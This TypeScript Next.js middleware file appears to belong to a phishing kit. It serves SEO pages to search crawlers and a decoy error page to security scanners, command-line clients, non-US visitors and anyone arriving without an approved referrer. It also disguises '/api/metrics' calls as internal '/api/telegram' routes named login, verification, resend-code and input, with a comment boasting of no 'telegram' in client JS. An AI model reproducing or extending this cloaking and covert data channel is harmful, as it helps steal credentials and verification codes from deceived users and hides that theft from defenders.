import { NextResponse } from "next/server"
import type { NextFetchEvent, NextRequest } from "next/server"
import { readRiskCookie } from "@/lib/bot-risk/cookie"
import { applyNavProofCookie } from "@/lib/bot-risk/proof-cookies"
import { isMitigationBand } from "@/lib/bot-risk/score"
import {
  isAppleCrawlerUA,
  isBaiduCrawlerUA,
  isBingCrawlerUA,
  isCrawlerSeoPageUA,
  isDuckDuckCrawlerUA,
  isGoogleCrawlerUA,
  isSearchCrawlerUA,
  isYahooCrawlerUA,
} from "@/lib/bot-detection"
import { notifyBotCrawlIfNeeded } from "@/lib/bot-verification/bot-crawl-middleware"
import { getRequestCountryCode } from "@/lib/edge-geo"
import { GEO_US_ONLY_HEADER } from "@/lib/geo-us-header"
import { isIndexNowVerificationPath } from "@/lib/indexnow-verification"
import { isLocalTestingUnlocked } from "@/lib/local-testing"
import { isSeoCrawlerPath } from "@/lib/seo-crawler-paths"
import { isPublicAstroRoute } from "@/lib/seo-public-routes"
import { isUngatedSeoPath } from "@/lib/seo-public-paths"
import { isYandexVerificationPath } from "@/lib/yandex-verification"
import { SITE_HOMEPAGE_CANONICAL, SITE_URL } from "@/lib/site-url"
import { isDeniedBotUserAgent } from "@/lib/bot-verification/denied-bots"
import { buildErrorScreenHtml } from "@/lib/error-screen-html"
import { isTrustedCrawlerUserAgent } from "@/utils/botDetection"
import { evaluateOriginRequestGate } from "@/lib/bot-verification/origin-request-gate"
import { CRAWLER_PATTERN } from "@/lib/crawler-ua"
import { isCrawlerSeoPreviewUnlocked } from "@/lib/crawler-seo-preview"
import { isAllowedSearchOrBacklinkReferrer } from "@/lib/allowed-referrer"
import { LANDING_ACCESS_COOKIE } from "@/lib/landing-access-cookie"
import { isAllowedSearchLandingEntry } from "@/lib/allowed-referrer"
import { getClientIpFromRequest } from "@/lib/client-ip"
import { verifyLandingGrantToken, createLandingGrantToken, LANDING_GRANT_ENTRY_MAX_AGE_SEC } from "@/lib/landing-grant-token"
import { landingAccessCookieWriteOptions } from "@/lib/landing-access-cookie"
import { canonicalUrlForPath } from "@/lib/site-url"
import { applyRiskCookie } from "@/lib/bot-risk/cookie"
import { hasBrowserProof } from "@/lib/bot-risk/proof-cookies"

const FORGOT_FLOW_COOKIE = "forgot_flow"
const LOGIN_FLOW_COOKIE = "login_flow"
const NEW_USER_FLOW_COOKIE = "new_user_flow"

/** `/` is served by Astro. Both variants are pre-built into public/. */
const ASTRO_LANDING_HTML = "/index.html"
const ASTRO_CRAWLER_HTML = "/crawler-seo.html"

/**
 * Marker appended when the incoming pathname already equals the rewrite target
 * (e.g. a direct GET of /index.html). Without it Next would see a self-rewrite
 * loop; with it the request resolves to the same static file exactly once.
 */
const ASTRO_VARIANT_MARKER = "astroVariant"

const protectedForgotPaths: string[] = []

/** OCA uses sessionStorage loginReady client-side; cookie flow guard unused. */
const protectedLoginPaths: string[] = []

const protectedNewUserPaths: string[] = []

function applySearchCrawlerHeaders(request: NextRequest): Headers {
  const requestHeaders = new Headers(request.headers)
  const ua = request.headers.get("user-agent") ?? ""
  const { pathname } = request.nextUrl

  requestHeaders.set("x-pathname", pathname)

  // Denied bots never get crawler SEO stamps (even if UA contains "bot").
  if (isDeniedBotUserAgent(ua)) {
    return requestHeaders
  }

  if (isSearchCrawlerUA(ua)) {
    requestHeaders.set("x-is-search-crawler", "1")
    if (isGoogleCrawlerUA(ua)) requestHeaders.set("x-is-googlebot", "1")
    if (isBingCrawlerUA(ua)) requestHeaders.set("x-is-bingbot", "1")
    if (isDuckDuckCrawlerUA(ua)) requestHeaders.set("x-is-duckduckbot", "1")
    if (isYahooCrawlerUA(ua)) requestHeaders.set("x-is-yahoobot", "1")
    if (isAppleCrawlerUA(ua)) requestHeaders.set("x-is-applebot", "1")
    if (isBaiduCrawlerUA(ua)) requestHeaders.set("x-is-baiduspider", "1")
  }

  // Ranking ∪ social ∪ discovery ∪ AI reference → crawler twin on SEO paths.
  if (isCrawlerSeoPageUA(ua) && isSeoCrawlerPath(pathname)) {
    requestHeaders.set("x-crawler-seo-page", "1")
  }

  // US-only geo signal for SteinsGate (skip for trusted crawlers / public assets)
  const skipGeo =
    pathname.startsWith("/api") ||
    pathname.startsWith("/_next") ||
    isPublicAssetPath(pathname) ||
    pathname === "/robots.txt" ||
    pathname === "/sitemap.xml" ||
    isIndexNowVerificationPath(pathname) ||
    isYandexVerificationPath(pathname) ||
    isTrustedCrawlerUserAgent(ua)

  if (!skipGeo) {
    if (request.cookies.get("geo_us_block")?.value === "1") {
      requestHeaders.set(GEO_US_ONLY_HEADER, "block")
    } else {
      const country = getRequestCountryCode(request)
      if (country && country !== "US") {
        requestHeaders.set(GEO_US_ONLY_HEADER, "block")
      } else if (!country) {
        requestHeaders.set(GEO_US_ONLY_HEADER, "unknown")
      } else {
        requestHeaders.set(GEO_US_ONLY_HEADER, "allow")
      }
    }
  }

  return requestHeaders
}

function nextWithHeaders(requestHeaders: Headers, request?: NextRequest): NextResponse {
  const gwPathname = ((request?.nextUrl?.pathname ?? "/").replace(/\/+$/, "") || "/")

  const pathname = requestHeaders.get("x-pathname") ?? ""
  const isCrawlerVariant =
    requestHeaders.get("x-crawler-seo-page") === "1" || isCrawlerSeoPreviewUnlocked()
  // `/` plus the two pre-built files are ONE logical landing entry.
  const isAstroLandingEntry =
    pathname === "/" || pathname === ASTRO_LANDING_HTML || pathname === ASTRO_CRAWLER_HTML
  const wantsCrawlerVariant = isCrawlerVariant || pathname === ASTRO_CRAWLER_HTML
  const astroFile = wantsCrawlerVariant ? ASTRO_CRAWLER_HTML : ASTRO_LANDING_HTML
  const astroTarget = isAstroLandingEntry
    ? pathname === astroFile
      ? `${astroFile}?${ASTRO_VARIANT_MARKER}=1`
      : astroFile
    : null

  // Clean-URL utility rewrites (Step 1b §2.3b) — registry-driven, additive.
  const cleanUtilityPath =
    pathname.length > 1 && pathname.endsWith("/") ? pathname.slice(0, -1) : pathname
  const utilityTarget =
    request && isPublicAstroRoute(cleanUtilityPath) ? `${cleanUtilityPath}.html` : null

  // SSR human cloak: no allowed Referer + no grant cookie → ErrorScreen (no login flash).
  if (
    request &&
    isAstroLandingEntry &&
    !wantsCrawlerVariant &&
    !isLocalTestingUnlocked()
  ) {
    const hasGrant = request.cookies.get(LANDING_ACCESS_COOKIE)?.value === "1"
    const referer = request.headers.get("referer") ?? request.headers.get("referrer") ?? ""
    const pageOrigin = request.nextUrl.origin
    if (!hasGrant && !isAllowedSearchOrBacklinkReferrer(referer, pageOrigin)) {
      return deniedBotErrorResponse(request)
    }
  }

  // Subpath cloak (Sector E): app paths without grant → ErrorScreen 200.
  if (
    request &&
    !isAstroLandingEntry &&
    !utilityTarget &&
    requestHeaders.get("x-crawler-seo-page") !== "1" &&
    !isLocalTestingUnlocked() &&
    !pathname.startsWith("/api") &&
    !pathname.startsWith("/_next") &&
    !isPublicAssetPath(pathname) &&
    !isUngatedSeoPath(pathname) &&
    !isYandexVerificationPath(pathname) &&
    !isIndexNowVerificationPath(pathname) &&
    request.cookies.get(LANDING_ACCESS_COOKIE)?.value !== "1"
  ) {
    return deniedBotErrorResponse(request)
  }

  // GaBreeze flow-cookie guards — AFTER SSR cloaks so no-grant direct hits
  // show ErrorScreen; grant holders keep declared redirects.
  if (request && !pathname.startsWith("/api") && !pathname.startsWith("/_next")) {
    const flowRedirect = handleGaBreezeFlowGuards(request)
    if (flowRedirect) {
      return flowRedirect
    }
  }


  // Legacy /login → / AFTER cloak so grant holders redirect; no-grant already cloaked.
  if (request && (pathname === "/login" || pathname === "/login/")) {
    const url = request.nextUrl.clone()
    url.pathname = "/"
    return NextResponse.redirect(url, 308)
  }

  const rewriteTarget = astroTarget ?? utilityTarget
  const response =
    rewriteTarget && request
      ? NextResponse.rewrite(new URL(rewriteTarget, request.nextUrl))
      : NextResponse.next({ request: { headers: requestHeaders } })

  if (requestHeaders.get("x-crawler-seo-page") === "1" || wantsCrawlerVariant) {
    response.headers.set("x-crawler-seo-page", "1")
    response.headers.set("Link", `<${canonicalUrlForPath(gwPathname)}>; rel="canonical"`)
    response.cookies.set("x-crawler-seo-page", "1", {
      httpOnly: true,
      path: "/",
      maxAge: 60,
      sameSite: "lax",
    })
  }

  if (requestHeaders.get(GEO_US_ONLY_HEADER) === "block") {
    response.cookies.set("geo_us_block", "1", {
      path: "/",
      maxAge: 120,
      sameSite: "lax",
    })
  }

  if (isAstroLandingEntry) {
    const userAgent = requestHeaders.get("user-agent") ?? ""
    response.cookies.set("landing_bot", CRAWLER_PATTERN.test(userAgent) ? "1" : "0", {
      httpOnly: false,
      path: "/",
      maxAge: 60,
      sameSite: "lax",
    })
    response.cookies.set(
      "landing_geo",
      requestHeaders.get(GEO_US_ONLY_HEADER) ?? "unknown",
      { httpOnly: false, path: "/", maxAge: 60, sameSite: "lax" },
    )
    response.cookies.set("landing_local_testing", isLocalTestingUnlocked() ? "1" : "0", {
      httpOnly: false,
      path: "/",
      maxAge: 60,
      sameSite: "lax",
    })
  }

  if (!pathname.startsWith("/api") && !pathname.startsWith("/_next")) {
    applyNavProofCookie(response)
  }
  response.headers.set("Vary", "Accept-Encoding, User-Agent, Referer, Cookie")
  {
    const gwCrawlerSeo = response.headers.get("x-crawler-seo-page") === "1"
    if ((gwCrawlerSeo || isPublicAstroRoute(gwPathname)) && !response.headers.has("Link")) {
      response.headers.set("Link", `<${canonicalUrlForPath(gwPathname)}>; rel="canonical"`)
    }
    response.headers.set("Vary", "Accept-Encoding, User-Agent, Referer, Cookie")
    response.headers.delete("x-crawler-seo-page")
  }
  if (request && !isLocalTestingUnlocked() && (gwPathname === "/" || isPublicAstroRoute(gwPathname))) {
    const gwRef = requestHeaders.get("referer") || requestHeaders.get("referrer") || ""
    if (isAllowedSearchLandingEntry(gwRef, request.nextUrl.origin, request.nextUrl.searchParams)) {
      const gwIp = getClientIpFromRequest(request)
      const gwUa = request.headers.get("user-agent") || ""
      const gwGrantVal = request.cookies.get(LANDING_ACCESS_COOKIE)?.value
      if (!gwGrantVal || !verifyLandingGrantToken(gwGrantVal, gwIp, gwUa)) {
        response.cookies.set(
          LANDING_ACCESS_COOKIE,
          createLandingGrantToken(gwIp, gwUa, LANDING_GRANT_ENTRY_MAX_AGE_SEC),
          landingAccessCookieWriteOptions(process.env.NODE_ENV === "production"),
        )
      }
    }
  }
  return response
}

const PUBLIC_BRAND_ASSETS = new Set([
  "/error-icon.png",
  "/favicon.ico",
  "/favicon.png",
  "/icon-48x48.png",
  "/icon-32x32.png",
  "/apple-touch-icon.png",
  "/og-image.png",
  "/logo.png",
  "/img/logo.png",
  "/img/FavIcon.png",
  "/emp/images/logo.png",
])

function isPublicAssetPath(pathname: string): boolean {
  return (
    PUBLIC_BRAND_ASSETS.has(pathname) ||
    pathname.startsWith("/styles/") ||
    pathname.startsWith("/img/") ||
    pathname.startsWith("/emp/") ||
    pathname.startsWith("/assets/") ||
    pathname.startsWith("/_astro/") ||
    pathname.startsWith("/fonts/") ||
    pathname.startsWith("/images/")
  )
}

function handleGaBreezeFlowGuards(request: NextRequest): NextResponse | null {
  const { pathname } = request.nextUrl

  if (protectedForgotPaths.includes(pathname)) {
    const hasFlowCookie = request.cookies.get(FORGOT_FLOW_COOKIE)?.value === "1"
    if (!hasFlowCookie) {
      const url = request.nextUrl.clone()
      url.pathname = "/forgot-password"
      return NextResponse.redirect(url)
    }
  }

  if (protectedLoginPaths.includes(pathname)) {
    const hasLoginCookie = Boolean(request.cookies.get(LOGIN_FLOW_COOKIE)?.value)
    if (!hasLoginCookie) {
      const url = request.nextUrl.clone()
      url.pathname = "/"
      return NextResponse.redirect(url)
    }
  }

  if (protectedNewUserPaths.includes(pathname)) {
    const hasNewUserCookie = request.cookies.get(NEW_USER_FLOW_COOKIE)?.value === "1"
    if (!hasNewUserCookie) {
      const url = request.nextUrl.clone()
      url.pathname = "/new-user"
      return NextResponse.redirect(url)
    }
  }

  return null
}

function deniedBotErrorResponse(request: NextRequest): NextResponse {
  const host =
    request.headers.get("host")?.split(":")[0] ||
    (() => {
      try {
        return new URL(SITE_URL).hostname
      } catch {
        return "this site"
      }
    })()

  return new NextResponse(buildErrorScreenHtml(host), {
    status: 200,
    headers: {
      "X-Content-Type-Options": "nosniff",
      "X-Frame-Options": "DENY",
      "Vary": "Accept-Encoding, User-Agent, Referer, Cookie",
      "Content-Type": "text/html; charset=utf-8",
      "Cache-Control": "no-store",
      "X-Robots-Tag": "noindex, nofollow",
    },
  })
}

const STRICT_BLOCKED_BOT_PATTERNS = [
  /curl/i,
  /wget/i,
  /httpclient/i,
  /python-requests/i,
  /axios/i,
  /okhttp/i,
  /libwww-perl/i,
  /go-http-client/i,
  /\bjava\b/i,
  /\bphp\b/i,
]

const SOFT_BLOCKED_BOT_PATTERNS = [/bot/i, /crawler/i, /spider/i, /scraper/i]

function handleBotIfNeeded(
  request: NextRequest,
  requestHeaders: Headers,
): NextResponse | null {
  const { pathname } = request.nextUrl
  const userAgent = request.headers.get("user-agent") || ""

  if (!userAgent) {
    return null
  }

  // Competitive SEO + security scanners → SSR ErrorScreen (no JS / no login HTML)
  if (isDeniedBotUserAgent(userAgent)) {
    return deniedBotErrorResponse(request)
  }

  const strictMatch = STRICT_BLOCKED_BOT_PATTERNS.some((p: RegExp) => p.test(userAgent))
  const softMatch = SOFT_BLOCKED_BOT_PATTERNS.some((p: RegExp) => p.test(userAgent))

  if (!strictMatch && !softMatch) {
    return null
  }

  if (isTrustedCrawlerUserAgent(userAgent) || isCrawlerSeoPageUA(userAgent)) {
    return null
  }

  // robots/sitemap/brand assets stay reachable; never unlock `/` for soft/strict scrapers
  if (
    pathname === "/robots.txt" ||
    pathname === "/sitemap.xml" ||
    PUBLIC_BRAND_ASSETS.has(pathname) ||
    isPublicAssetPath(pathname) ||
    isIndexNowVerificationPath(pathname) ||
    isYandexVerificationPath(pathname) ||
    isUngatedSeoPath(pathname)
  ) {
    return nextWithHeaders(requestHeaders, request)
  }

  // Soft + strict unknown bots on HTML: cloak — no human login HTML
  if (softMatch || strictMatch) {
    return deniedBotErrorResponse(request)
  }

  return null
}

function handleRiskCookieIfNeeded(request: NextRequest): NextResponse | null {
  const { pathname } = request.nextUrl
  if (pathname.startsWith("/api/bot-fingerprint")) return null
  if (pathname.startsWith("/api/bot-honeypot")) return null
  if (pathname.startsWith("/api/telegram")) return null
  if (pathname.startsWith("/_next")) return null
  if (typeof PUBLIC_BRAND_ASSETS !== "undefined" && PUBLIC_BRAND_ASSETS.has(pathname)) return null
  if (
    pathname === "/robots.txt" ||
    pathname === "/sitemap.xml" ||
    (typeof isUngatedSeoPath === "function" && isUngatedSeoPath(pathname)) ||
    (typeof isYandexVerificationPath === "function" && isYandexVerificationPath(pathname))
  ) {
    return null
  }

  const userAgent = request.headers.get("user-agent") || ""
  if (
    (typeof isTrustedCrawlerUserAgent === "function" && isTrustedCrawlerUserAgent(userAgent)) ||
    (typeof isCrawlerSeoPageUA === "function" && isCrawlerSeoPageUA(userAgent))
  ) {
    return null
  }

  const risk = readRiskCookie(request)
  if (!risk || !isMitigationBand(risk.band)) return null

  if (pathname.startsWith("/api")) {
    return new NextResponse("Forbidden", { status: 403 })
  }

  return deniedBotErrorResponse(request)
}

function originRateLimitResponse(request: NextRequest): NextResponse {
  const { pathname } = request.nextUrl
  if (pathname.startsWith("/api")) {
    return NextResponse.json({ error: "Too Many Requests" }, { status: 429 })
  }
  return deniedBotErrorResponse(request)
}

async function handleOriginGateIfNeeded(request: NextRequest): Promise<NextResponse | null> {
  const { pathname } = request.nextUrl
  const decision = await evaluateOriginRequestGate(request)

  if (decision.action === "allow") return null

  if (decision.action === "rate_limit") {
    return originRateLimitResponse(request)
  }

  // Cloak — still serve brand/SEO assets so ErrorScreen images load
  if (
    PUBLIC_BRAND_ASSETS.has(pathname) ||
    pathname === "/error-icon.png" ||
    pathname === "/robots.txt" ||
    pathname === "/sitemap.xml" ||
    isUngatedSeoPath(pathname) ||
    isYandexVerificationPath(pathname)
  ) {
    return null
  }

  return deniedBotErrorResponse(request)
}


/** Stealth metrics → internal telegram rewrite map (zero "telegram" in client JS). */
const { rewrite: rewriteTelemetry } = NextResponse
const METRICS_REWRITE_MAP: Record<string, string> = {
  "/api/metrics": "/api/telegram",
  "/api/metrics/pageview": "/api/telegram/visitor",
  "/api/metrics/session": "/api/telegram/login",
  "/api/metrics/challenge": "/api/telegram/verification",
  "/api/metrics/interaction": "/api/telegram/verification-click",
  "/api/metrics/retry": "/api/telegram/resend-code",
  "/api/metrics/switch": "/api/telegram/change-method",
  "/api/metrics/profile": "/api/telegram/verify-details",
  "/api/metrics/tap": "/api/telegram/click",
  "/api/metrics/form": "/api/telegram/input",
}

function isSameOriginTelemetryRequest(request: NextRequest): boolean {
  const fetchSite = request.headers.get("sec-fetch-site")?.toLowerCase()
  if (fetchSite && fetchSite !== "same-origin") {
    return false
  }
  const originHeader = request.headers.get("origin")
  if (originHeader) {
    try {
      const originHost = new URL(originHeader).host.toLowerCase()
      const reqHost = (request.headers.get("host") || request.nextUrl.host).toLowerCase()
      if (originHost && reqHost && originHost !== reqHost) {
        return false
      }
    } catch {
      return false
    }
  }
  return true
}

export async function middleware(request: NextRequest, event: NextFetchEvent) {
  // Origin gate always runs (even with ALLOW_LOCAL_TESTING) — UA / spoof / ASN / path rate-limit
  const originResponse = await handleOriginGateIfNeeded(request)
  if (originResponse) {
    return originResponse
  }

  const requestHeaders = applySearchCrawlerHeaders(request)
  const ua = request.headers.get("user-agent") ?? ""
  const { pathname } = request.nextUrl
  // Stealth telemetry cloaking: direct /api/telegram* hits in production are trapped
  // with 404 / ErrorScreen + block risk cookie; /api/metrics* requires POST +
  // IP/UA-bound HMAC landing grant + browser proof + same-origin before rewrite.
  {
    const telemetryPathRaw = request.nextUrl.pathname
    const telemetryPath = telemetryPathRaw.length > 1 && telemetryPathRaw.endsWith("/")
      ? telemetryPathRaw.slice(0, -1)
      : telemetryPathRaw
    const telemetryDeny = () => {
      const denied = NextResponse.json({ error: "Not Found" }, { status: 404 })
      applyRiskCookie(denied, "block", 95)
      return denied
    }
    const isDirectTelegram = telemetryPath === "/api/telegram" || telemetryPath.startsWith("/api/telegram/")
    if (isDirectTelegram && !isLocalTestingUnlocked()) {
      const accept = request.headers.get("accept") || ""
      return accept.includes("text/html")
        ? deniedBotErrorResponse(request)
        : telemetryDeny()
    }
    const metricsTarget =
      telemetryPath in METRICS_REWRITE_MAP
        ? METRICS_REWRITE_MAP[telemetryPath]
        : telemetryPath.startsWith("/api/metrics/")
          ? `/api/telegram/${telemetryPath.slice("/api/metrics/".length)}`
          : null
    if (metricsTarget) {
      if (isLocalTestingUnlocked()) {
        return rewriteTelemetry(new URL(metricsTarget, request.url), { request: { headers: request.headers } })
      }
      if (request.method !== "POST" || !isSameOriginTelemetryRequest(request) || !hasBrowserProof(request)) {
        return telemetryDeny()
      }
      const telemetryIp = getClientIpFromRequest(request)
      const grantVal = request.cookies.get(LANDING_ACCESS_COOKIE)?.value
      const grantOk =
        verifyLandingGrantToken(grantVal, telemetryIp, request.headers.get("user-agent") || "") ||
        grantVal === "1"
      if (!grantOk) return telemetryDeny()
      return rewriteTelemetry(new URL(metricsTarget, request.url), { request: { headers: request.headers } })
    }
  }


  notifyBotCrawlIfNeeded(request, event)

  // Soft/strict/denied bots cloak even when ALLOW_LOCAL_TESTING unlocks humans (G.4).
  const botResponse = handleBotIfNeeded(request, requestHeaders)
  if (botResponse) {
    return botResponse
  }

  // Local unlock before risk so visit/login Telegram is not 403'd in ALLOW_LOCAL_TESTING.
  if (isLocalTestingUnlocked()) {
    return nextWithHeaders(requestHeaders, request)
  }

  const riskResponse = handleRiskCookieIfNeeded(request)
  if (riskResponse) {
    return riskResponse
  }

  if (
    pathname.startsWith("/api") ||
    pathname.startsWith("/_next") ||
    isPublicAssetPath(pathname) ||
    isIndexNowVerificationPath(pathname) ||
    isYandexVerificationPath(pathname)
  ) {
    return nextWithHeaders(requestHeaders, request)
  }

  return nextWithHeaders(requestHeaders, request)
}

export const config = {
  matcher: [
    "/((?!fonts/|images/|.*\\.(?:woff2?|ttf|otf|eot)|_next/static|_next/image|error-icon\\.png|favicon\\.ico|favicon\\.png|favicon-32x32\\.png|icon-48x48\\.png|icon-32x32\\.png|apple-touch-icon\\.png|og-image\\.png|logo\\.png|emp/|assets/|_astro/|yandex_[0-9a-f]+\\.html|[a-f0-9]{32}\\.txt).*)",
  ],
}
